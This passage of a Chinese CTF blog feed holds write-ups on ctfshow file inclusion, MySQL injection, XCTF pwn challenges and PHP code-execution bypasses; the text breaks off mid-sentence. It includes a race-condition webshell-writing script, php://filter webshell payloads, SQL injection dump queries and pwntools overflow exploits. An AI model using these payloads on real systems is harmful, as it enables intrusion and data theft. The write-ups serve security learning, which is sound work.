class="hljs-string">&#x27;http://ea1277ef-6dd0-4b65-9d85-c0b0e216a679.challenge.ctf.show:8080/&#x27;</span><br>sessionid=<span class="hljs-string">&#x27;ctfshow&#x27;</span><br>data=&#123;<br><span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br>&#125;<br><span class="hljs-comment">#&lt;?php eval($_POST[1]);?&gt;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">session</span>):</span><br>fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">50</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>response=session.post(url,<br>data=&#123;<br><span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>&#125;,<br>cookies=&#123;<br><span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessionid<br>&#125;,<br>files=&#123;<br><span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)<br>&#125;<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">session</span>):</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>response=session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,<br>cookies=&#123;<br><span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessionid<br>&#125;<br>)<br>resposne2=session.get(url+<span class="hljs-string">&#x27;2.php&#x27;</span>)<br><span class="hljs-keyword">if</span> resposne2.status_code==<span class="hljs-number">200</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;++++++done++++++&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(resposne2.status_code)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>evnet=threading.Event()<br><span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>threading.Thread(target=write,args=(session,)).start()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>threading.Thread(target=read,args=(session,)).start()<br><br>evnet.<span class="hljs-built_in">set</span>()<br></code></pre></td></tr></table></figure><h3 id="web87">web87</h3><p>看看漏洞出现的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    file_put_contents(urldecode(<span class="hljs-variable">$file</span>), <span class="hljs-string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="hljs-variable">$content</span>);<br><br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里题目中有<code>urldecode</code>，因此我们可以两次<code>url</code>编码绕过。</p><p><code>file_put_contents</code>，我们可以利用<code>php</code>伪协议</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?file=php://filter/write=string.rot13/resource=1.php<br></code></pre></td></tr></table></figure><p>这个协议的意思是我们将内容按<code>rot13</code>编码写入<code>1.php</code>文件,，这样我们就可以将语句中的<code>die</code>语句被处理，同时将我们要写入的内容按<code>rot13</code>编码写入（两次<code>rot13</code>就会回到最初的代码），最后成功绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>cuc @riny(<span class="hljs-variable">$_CBFG</span>[<span class="hljs-number">1</span>]);uvtuyvtug_svyr(__SVYR__); <span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//<span class="hljs-meta">&lt;?php</span> @eval($_POST[1]);highlight_file(__FILE__);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="web88">web88</h3><p>先看漏洞成因代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们观察发现，没有ban引号和斜杠，那我们考虑使用data伪协议来实现文件包含，不过这里还是ban了<code>=</code>和<code>+</code>，这里对于构造的payload比较麻烦，这里分享一个trick：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//对于PHP,base64_decode()会自动填充末尾的=</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> base64_decode(<span class="hljs-string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg&quot;</span>).<span class="hljs-string">&quot;\n&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> base64_decode(<span class="hljs-string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg=&quot;</span>).<span class="hljs-string">&quot;\n&lt;br&gt;&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>所以后面的事情就很简单了，不再说明了。</p><h3 id="web116">web116</h3><p>打开以后是一个视频，我们下载下来，然后提取出其中的PNG图片，直接抓包重放解决问题。</p><h3 id="web117">web117</h3><p>先看漏洞成因代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too young too simple sometimes naive!&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br>filter(<span class="hljs-variable">$file</span>);<br>file_put_contents(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="hljs-variable">$contents</span>);<br></code></pre></td></tr></table></figure><p>还是写入文件，绕过死亡die的一个套路，但是这道题我们的rot13被ban掉了，因此我们需要引入新的编码方式，这里参考了一下羽师傅的payload。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php<br></code></pre></td></tr></table></figure><p>这里利用了一个<code>UCS-2LE.UCS-2BE</code>的编码方式，将相邻的两个字符交换位置。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">content=?&lt;hp pvela$(P_SO[T]1;)&gt;?<br></code></pre></td></tr></table></figure><p>这样就成功写入文件。</p><p>PHP支持的更多编码方式:</p><p>https://www.php.net/manual/zh/mbstring.supported-encodings.php</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctfshow</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>LFI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL注入总结</title>
    <link href="/2022/03/31/blog0002-MySQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/03/31/blog0002-MySQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>这一篇，主要记录一下见过的一些MySQL注入的trick，总结一下各种MySQL注入的方法。</p><span id="more"></span><h2 id="一报错注入">一、报错注入</h2><p>当你在前端输入执行<code>sql</code>注入语句，后端执行之后，把错误信息返回给了前端，从而使你获取到了数据库的信息。</p><h2 id="二联合注入">二、联合注入</h2><h3 id="基本说明">1、基本说明</h3><p>SQL注入中最经典的就是联合查询，先上经典三板斧</p><p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆破库名<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆破表名<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#123;database_name&#125;&#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆破列名<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#123;database_name&#125;&#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆破列名<span class="hljs-number">-2</span><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#123;table_name&#125;&#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆破内容<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-number">0x5c</span>,&#123;column_name&#125;,<span class="hljs-number">0x5c</span>,&#123;colunm_name&#125;) <span class="hljs-keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;);<br># 注意， 爆破内容时我们要考虑引号的问题<br># 补一个爆破内容的例子：<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-number">0x5c</span>,id,<span class="hljs-number">0x5c</span>,name) <span class="hljs-keyword">from</span> whistle.user);<br></code></pre></td></tr></table></figure><p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p><h3 id="补充">2、补充</h3><p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p><p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> ......<br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span><br></code></pre></td></tr></table></figure><p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p><h2 id="二堆叠注入">二、堆叠注入</h2><h3 id="说明">1、说明</h3><p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p><p>大致的原理和RCE中的管道运算符注入一样。</p><h3 id="补充-1">2、补充</h3><p>先上"随便注"的payload</p><p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p><p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-variable">@sql</span><span class="hljs-operator">=</span>concat(<span class="hljs-string">&#x27;sel&#x27;</span>,<span class="hljs-string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="hljs-keyword">Prepare</span> uut <span class="hljs-keyword">from</span> <span class="hljs-variable">@sql</span>; <span class="hljs-keyword">execute</span> uut;  <span class="hljs-comment">-- - </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web漏洞</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn-xctf-新手区wp</title>
    <link href="/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
    <url>/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
    
    <content type="html"><![CDATA[<p>开始pwn的学习之旅啦。</p><p>更新：pwn的学习一直断断续续，中间也转换使用ctf-wiki来作为主要学习平台。这篇博客只能有缘再更新了。</p><span id="more"></span><h2 id="一level_2">一、Level_2</h2><p>pwn到手第一步，先玩一玩看看.</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png" /></p><p>简单的输入提示，基本上获得不了什么信息。</p><p>pwn到手第二步，反手来一个checksec看看一些基本信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:     i386-32-little<br>RELRO:    Partial RELRO<br>Stack:    No canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure><p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call system 和 read，这给了我们布栈的空间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0804844b &lt;+0&gt;:push   ebp<br>0x0804844c &lt;+1&gt;:mov    ebp,esp<br>0x0804844e &lt;+3&gt;:sub    esp,0x88<br>0x08048454 &lt;+9&gt;:sub    esp,0xc<br>0x08048457 &lt;+12&gt;:push   0x8048540<br>0x0804845c &lt;+17&gt;:call   0x8048320 &lt;system@plt&gt;<br>0x08048461 &lt;+22&gt;:add    esp,0x10<br>0x08048464 &lt;+25&gt;:sub    esp,0x4<br>0x08048467 &lt;+28&gt;:push   0x100<br>0x0804846c &lt;+33&gt;:lea    eax,[ebp-0x88]//read 写入的内存起点<br>0x08048472 &lt;+39&gt;:push   eax<br>0x08048473 &lt;+40&gt;:push   0x0<br>0x08048475 &lt;+42&gt;:call   0x8048310 &lt;read@plt&gt;<br>0x0804847a &lt;+47&gt;:add    esp,0x10<br>0x0804847d &lt;+50&gt;:nop<br>0x0804847e &lt;+51&gt;:leave  <br>0x0804847f &lt;+52&gt;:ret  <br></code></pre></td></tr></table></figure><p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 "/bin/sh"的地址。</p><p>当ret时，我们回到了call 0x8048320 <a href="mailto:system@plt" class="email">system@plt</a>，此时esp由于pop eip的效果，此时内部存放着"/bin/sh"的地址，这也顺利地完成了system函数的参数布置。</p><p>Python的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&quot;debug&quot;</span>, arch=<span class="hljs-string">&quot;i386&quot;</span>, os=<span class="hljs-string">&quot;linux&quot;</span>)<br><br><span class="hljs-comment"># 111.200.241.244:65392</span><br>io = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;65392&quot;</span>)<br><span class="hljs-comment"># io = process(&quot;./xctf_2&quot;)</span><br><br>dam=<span class="hljs-string">&quot;Input:\n&quot;</span><br>ret_addr = <span class="hljs-number">0x804845c</span><br>bin_addr = <span class="hljs-number">0x804a024</span><br>fill_num = <span class="hljs-number">0x88</span> + <span class="hljs-number">0x4</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)<br><br>io.sendlineafter(dam,payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="二guess_num">二、guess_num</h2><p>这道题有点意思，丢到ida里面就可以发现这是一个猜随机数的题。</p><p>这里其实是之前web里面遇到的一个点，我们直接把seed[0]给覆盖了，那么随机数的产生就是确定的。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_2.png" /></p><p>exp.py如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>)<br><br>io=remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;60037&quot;</span>)<br><br>dam=<span class="hljs-string">&quot;Your name:&quot;</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x1</span>)<br>num_list = [<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]<br><br>io.sendlineafter(dam, payload)<br><br>dam_1 = <span class="hljs-string">&quot;Please input your guess number:&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    io.sendlineafter(dam_1,<span class="hljs-built_in">str</span>(num_list[i]).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="三int_overflow整数溢出">三、int_overflow（整数溢出）</h2><p>整数溢出这个就没什么好说的，在高程作业中做太多了。</p><p>重点是来看看我们要如何利用这个漏洞来实现攻击的，shift+F12，我们可以发现源程序中存在get_shell()的后门，并且没开PIE，这就给了我们re2text的利用空间。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_3.png" /></p><p>很显然，我们可以尝试利用dest的空间来修改ret的地址，但是我们要如何进入这个分支呢？</p><p>注意到，v3是unsigned __int8 类型，当int strlen(char *)赋值时，会发生高位截断，所以我们只需要写入一个长度超过256的字符串给s，就能实现栈空间数据的修改。</p><p>补充：我们可以考虑在其他函数中read字符串的时候实现re2text，但是这道题在输入时限制的read的长度，所以我们只能考虑利用整数溢出来实现。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level=<span class="hljs-string">&quot;debug&quot;</span>, arch=<span class="hljs-string">&quot;i386&quot;</span>, os=<span class="hljs-string">&quot;linux&quot;</span>)<br><br>pwnfile = <span class="hljs-string">&quot;./xctf_4&quot;</span><br><br><span class="hljs-comment">#io=process(pwnfile)</span><br>io=remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;54657&quot;</span>)<br><br>elf = ELF(pwnfile)<br><br><br>leak_func_name = <span class="hljs-string">&quot;what_is_this&quot;</span><br>leak_func_addr = elf.symbols[leak_func_name]<br><br>payload = (<span class="hljs-number">0x14</span> + <span class="hljs-number">0x04</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(leak_func_addr) + (<span class="hljs-number">260</span>-<span class="hljs-number">0x14</span>-<span class="hljs-number">0x04</span>-<span class="hljs-number">0x04</span>) * <span class="hljs-string">b&#x27;a&#x27;</span><br><br>choice = <span class="hljs-string">&quot;1&quot;</span><br>dam_0 = <span class="hljs-string">&quot;Your choice:&quot;</span><br>io.sendlineafter(dam_0, choice)<br><br>name = <span class="hljs-string">&quot;hello&quot;</span><br>dam_1 = <span class="hljs-string">&quot;Please input your username:\n&quot;</span> <br>io.sendlineafter(dam_1,name)<br><br>dam_2 = <span class="hljs-string">&quot;Please input your passwd:&quot;</span><br>io.sendlineafter(dam_2,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
      <tag>xctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码执行绕过总结</title>
    <link href="/2022/03/02/blog0005-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/"/>
    <url>/2022/03/02/blog0005-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>这一篇大概总结一下常见的代码执行的一些技巧，其中很大一部分应该都是CTF中才会用使用的技巧了。</p><span id="more"></span><h2 id="一php代码执行">一、PHP代码执行</h2><h3 id="基础使用">1.1、基础使用</h3><p>PHP常见的代码执行手段主要有两种，eval 和 assert。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span> : PHP的语言结构，可以将字符串作为代码内容执行<br><span class="hljs-keyword">assert</span>:在PHP5时可以作为PHP的函数，许多常见的免杀Webshell也以<span class="hljs-keyword">assert</span>作为动态函数来实现攻击。<br>在PHP7修改为PHP的语言结构，不能使用动态函数来进行利用了<br></code></pre></td></tr></table></figure><h3 id="动态函数免杀">1.2、动态函数免杀</h3><p>PHP的一个特性就是动态函数。</p><h3 id="无字母数字webshell">1.3、无字母数字Webshell</h3><p>当字母和数字被过滤的时候，我们有的时候也可以考虑用PHP字符串位运算绕过的形式。</p><p>在PHP中"abc"|"abc"会将两个字符串转成ASCII二进制形式，如0x616263|0x616263 = 0x616263</p><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>分析题目我们发现可以 | 